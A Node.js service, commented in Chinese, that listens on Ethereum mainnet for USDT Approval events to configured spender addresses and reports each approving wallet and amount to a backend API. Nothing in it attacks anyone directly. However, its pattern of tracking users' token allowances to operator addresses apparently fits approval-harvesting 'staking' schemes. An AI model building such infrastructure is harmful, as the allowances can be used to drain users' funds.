/**
 * USDT Approval 事件监听服务（Infura 版本）
 * 
 * 使用 Infura WebSocket 替代 Alchemy
 * 功能完全相同，但不需要 VPN 注册
 */

const { ethers } = require('ethers')
const fetch = require('node-fetch')
require('dotenv').config()

// ========== 配置 ==========
const CONFIG = {
  // Infura WebSocket URL
  INFURA_WS_URL: `wss://mainnet.infura.io/ws/v3/${process.env.INFURA_API_KEY}`,
  
  // 合约地址
  USDT_CONTRACT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  YOUR_STAKING_CONTRACT: '0xc8aC739F97Ba872b49FAfCfA072b5965fe4bE218', // 向后兼容，如果未配置权限地址则使用此地址
  
  // 后端 API
  API_ENDPOINT: process.env.API_ENDPOINT || 'https://ethmax.vercel.app',
  
  // 健康检查间隔
  HEARTBEAT_INTERVAL: 60000
}

// 权限地址列表（从后端 API 获取）
let permissionAddresses = []

// 获取权限地址配置
async function fetchPermissionAddresses() {
  try {
    const response = await fetch(`${CONFIG.API_ENDPOINT}/api/config/auth?chain_type=ERC`)
    const result = await response.json()
    
    if (result.success && result.data?.permission_addresses?.length > 0) {
      permissionAddresses = result.data.permission_addresses.map(addr => addr.toLowerCase())
      console.log(`✅ 获取到 ${permissionAddresses.length} 个权限地址配置`)
      console.log('   权限地址列表:', permissionAddresses)
      return true
    } else {
      console.log('⚠️  未找到权限地址配置，使用默认质押合约地址')
      permissionAddresses = [CONFIG.YOUR_STAKING_CONTRACT.toLowerCase()]
      return false
    }
  } catch (error) {
    console.error('❌ 获取权限地址配置失败:', error)
    permissionAddresses = [CONFIG.YOUR_STAKING_CONTRACT.toLowerCase()]
    return false
  }
}

// 检查地址是否是有效的权限地址
function isValidPermissionAddress(address) {
  if (permissionAddresses.length === 0) {
    return true // 如果没有配置，允许所有地址（向后兼容）
  }
  return permissionAddresses.includes(address.toLowerCase())
}

// 验证配置
if (!process.env.INFURA_API_KEY) {
  console.error('❌ 错误：未设置 INFURA_API_KEY 环境变量')
  console.error('   获取 API Key: https://infura.io/')
  process.exit(1)
}

// 统计信息
const stats = {
  startTime: new Date(),
  totalApprovals: 0,
  successfulProcessed: 0,
  failedProcessed: 0,
  lastApprovalTime: null,
  reconnections: 0
}

// ========== 初始化 WebSocket Provider ==========
console.log('\n🔧 初始化 Infura WebSocket Provider...')
let provider

function createProvider() {
  const newProvider = new ethers.providers.WebSocketProvider(CONFIG.INFURA_WS_URL)
  
  // WebSocket 错误处理
  newProvider._websocket.on('error', (error) => {
    console.error('❌ WebSocket 错误:', error.message)
  })
  
  newProvider._websocket.on('close', (code) => {
    console.warn(`⚠️  WebSocket 连接关闭 (code: ${code})`)
    console.log('🔄 将在 5 秒后尝试重连...')
    stats.reconnections++
    
    setTimeout(() => {
      console.log('🔄 正在重新连接...')
      provider = createProvider()
      startApprovalMonitor()
    }, 5000)
  })
  
  return newProvider
}

provider = createProvider()
console.log('✅ Infura WebSocket Provider 初始化成功')

// ========== Approval 事件监听 ==========
async function startApprovalMonitor() {
  console.log('\n' + '='.repeat(60))
  console.log('🎯 USDT Approval 事件监听服务 (Infura 版本)')
  console.log('='.repeat(60))
  console.log(`📍 监听合约: ${CONFIG.USDT_CONTRACT}`)
  console.log(`🌐 后端 API: ${CONFIG.API_ENDPOINT}`)
  console.log('='.repeat(60) + '\n')

  // 获取权限地址配置
  await fetchPermissionAddresses()

  try {
    // 创建 Approval 事件过滤器（监听所有 Approval 事件，然后在回调中过滤）
    const filter = {
      address: CONFIG.USDT_CONTRACT,
      topics: [
        ethers.utils.id('Approval(address,address,uint256)')
      ]
    }

    console.log('🔍 过滤器配置:')
    console.log('   - 合约地址:', filter.address)
    console.log('   - 事件签名:', filter.topics[0])
    console.log('   - 监听所有 Approval 事件，然后过滤权限地址')
    console.log()

    // 开始监听
    console.log('🎧 开始监听 Approval 事件...\n')
    
    provider.on(filter, async (log) => {
      try {
        stats.totalApprovals++
        stats.lastApprovalTime = new Date()
        
        console.log('\n' + '━'.repeat(60))
        console.log('🔔 收到 Approval 事件!')
        console.log('━'.repeat(60))
        
        // 解析事件数据
        const iface = new ethers.utils.Interface([
          'event Approval(address indexed owner, address indexed spender, uint256 value)'
        ])
        const parsed = iface.parseLog(log)
        
        const userAddress = parsed.args.owner
        const spender = parsed.args.spender
        const rawValue = parsed.args.value
        const amount = ethers.utils.formatUnits(rawValue, 6)
        const txHash = log.transactionHash
        const blockNumber = log.blockNumber
        
        console.log('📊 事件详情:')
        console.log(`   👤 授权者: ${userAddress}`)
        console.log(`   🎯 被授权者: ${spender}`)
        console.log(`   💰 授权额度: ${amount} USDT`)
        console.log(`   🔗 交易哈希: ${txHash}`)
        console.log(`   📦 区块高度: ${blockNumber}`)
        console.log()
        
        // 验证 spender 是否是配置的权限地址
        if (!isValidPermissionAddress(spender)) {
          console.log('⚠️  警告：spender 不在配置的权限地址列表中，跳过')
          console.log(`   spender: ${spender}`)
          console.log(`   配置的权限地址: ${permissionAddresses.join(', ')}`)
          return
        }
        
        console.log('✅ 验证通过：用户授权给配置的权限地址!')
        console.log()
        
        // 处理授权（传递 spender 地址给后端）
        await handleApproval({
          userAddress,
          spenderAddress: spender,
          amount,
          txHash,
          blockNumber
        })
        
      } catch (error) {
        stats.failedProcessed++
        console.error('❌ 处理 Approval 事件失败:', error)
        if (error instanceof Error) {
          console.error('   错误信息:', error.message)
        }
      }
    })

    console.log('✅ Approval 监听服务已启动 (Infura WebSocket)')
    console.log('💡 当用户授权时，会自动处理\n')
    
  } catch (error) {
    console.error('❌ 启动监听失败:', error)
    process.exit(1)
  }
}

// ========== 处理授权 ==========
async function handleApproval({ userAddress, spenderAddress, amount, txHash, blockNumber }) {
  console.log('🔄 开始处理授权...')
  
  try {
    console.log(`📡 调用后端 API: ${CONFIG.API_ENDPOINT}/api/user/authorize`)
    
    const response = await fetch(`${CONFIG.API_ENDPOINT}/api/user/authorize`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        wallet_address: userAddress,
        spender_address: spenderAddress, // 传递权限地址
        isAuthorized: true,
        txHash: txHash,
        amount: amount.replace(/,/g, ''),
        source: 'approval_monitor_infura',
        blockNumber: blockNumber
      })
    })

    if (!response.ok) {
      throw new Error(`API 返回错误: ${response.status}`)
    }

    const result = await response.json()
    
    if (result.success) {
      stats.successfulProcessed++
      console.log('✅ 后端处理成功!')
      console.log(`   📝 用户 ID: ${result.data?.userId || '未知'}`)
      console.log(`   🎁 奖励已发放`)
      console.log(`   📡 已添加到交易监听`)
      console.log()
      console.log('🎉 授权处理完成!')
      return { success: true }
    } else {
      stats.failedProcessed++
      console.warn('⚠️  后端处理失败:', result.error)
      return { success: false, error: result.error }
    }
    
  } catch (error) {
    stats.failedProcessed++
    console.error('❌ 调用后端 API 失败:', error)
    return { success: false, error: error instanceof Error ? error.message : '未知错误' }
  }
}

// ========== 健康检查 ==========
function startHealthCheck() {
  setInterval(() => {
    const uptime = Math.floor((Date.now() - stats.startTime.getTime()) / 1000)
    const hours = Math.floor(uptime / 3600)
    const minutes = Math.floor((uptime % 3600) / 60)
    const seconds = uptime % 60
    
    console.log('\n' + '─'.repeat(60))
    console.log('💓 健康检查 (Infura WebSocket)')
    console.log('─'.repeat(60))
    console.log(`⏰ 运行时间: ${hours}时${minutes}分${seconds}秒`)
    console.log(`🔄 重连次数: ${stats.reconnections}`)
    console.log(`📊 总计事件: ${stats.totalApprovals}`)
    console.log(`✅ 处理成功: ${stats.successfulProcessed}`)
    console.log(`❌ 处理失败: ${stats.failedProcessed}`)
    console.log(`🕐 最后事件: ${stats.lastApprovalTime ? stats.lastApprovalTime.toLocaleString('zh-CN') : '无'}`)
    console.log(`📅 当前时间: ${new Date().toLocaleString('zh-CN')}`)
    console.log('─'.repeat(60) + '\n')
  }, CONFIG.HEARTBEAT_INTERVAL)
}

// ========== 错误处理 ==========
process.on('SIGINT', () => {
  console.log('\n\n👋 正在关闭...')
  console.log('\n📊 最终统计:')
  console.log(`   总计事件: ${stats.totalApprovals}`)
  console.log(`   处理成功: ${stats.successfulProcessed}`)
  console.log(`   处理失败: ${stats.failedProcessed}`)
  console.log(`   重连次数: ${stats.reconnections}`)
  provider.removeAllListeners()
  provider._websocket.close()
  console.log('\n✅ 服务已停止\n')
  process.exit(0)
})

// ========== 启动 ==========
async function main() {
  console.log('\n🚀 启动 USDT Approval 监听服务 (Infura)...\n')
  await startApprovalMonitor()
  startHealthCheck()
  console.log('✅ 服务启动完成！\n')
}

main().catch((error) => {
  console.error('❌ 启动失败:', error)
  process.exit(1)
})

